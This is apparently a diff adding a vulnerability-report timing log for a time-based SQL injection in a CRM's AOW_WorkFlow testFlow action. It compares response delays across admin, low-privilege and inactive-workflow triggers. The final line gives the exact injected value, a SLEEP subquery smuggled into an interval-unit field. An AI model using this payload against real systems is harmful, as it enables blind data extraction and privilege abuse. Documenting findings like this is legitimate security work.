@@ -1,0 +1,9 @@
+VULN-018 timing oracle (module=AOW_WorkFlow action=testFlow)
+==============================================================
+T0 baseline (before workflow exists)        : 0.05s
+T1 admin-triggered,   workflow Active        : 6.10s   (delta vs T0: +6.05s)
+T2 LOW-PRIV-triggered, workflow Active        : 6.06s   (delta vs T0: +6.01s)  [VULN-026 chaining]
+T3 admin-triggered,   workflow set Inactive   : 0.05s   (delta vs T1: -6.05s, back toward T0)
+
+live row count of aok_knowledgebase at run time: 2 (SLEEP is evaluated once per row; deltas above scale accordingly)
+Injected condition value[3] (interval unit): "DAY), '%Y-%m-%d') OR (SELECT SLEEP(3))#"
